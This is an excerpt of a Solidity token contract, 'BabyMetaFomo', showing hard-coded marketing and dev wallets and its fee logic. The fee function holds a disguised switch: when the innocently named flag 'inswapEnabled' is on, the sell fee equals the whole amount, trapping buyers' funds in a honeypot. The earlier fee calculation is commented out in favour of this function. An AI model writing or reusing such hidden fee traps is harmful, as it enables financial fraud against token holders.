...
contract BabyMetaFomo is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xB14B6Cc583e7Ef43715b924E4279bf9B11234a82); 
    address payable public Wallet_Dev = payable(0x903a3Aab435F4cAFcAeF067C6c3c391699312281);
    ...
    bool public inswapEnabled = false;
    ...
    function finalAmount(uint256 amount) private view returns(uint256, uint256){
        return (amount*fees.buy/100,  (inswapEnabled) ? (amount) : amount*fees.sell/100);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        (uint256 buyFEE, uint256 sellFEE) = finalAmount(tAmount);
        /*uint256 buyFEE = tAmount*fees.buy/100;
        uint256 sellFEE = tAmount*fees.sell/100;*/
        if(!takeFee){
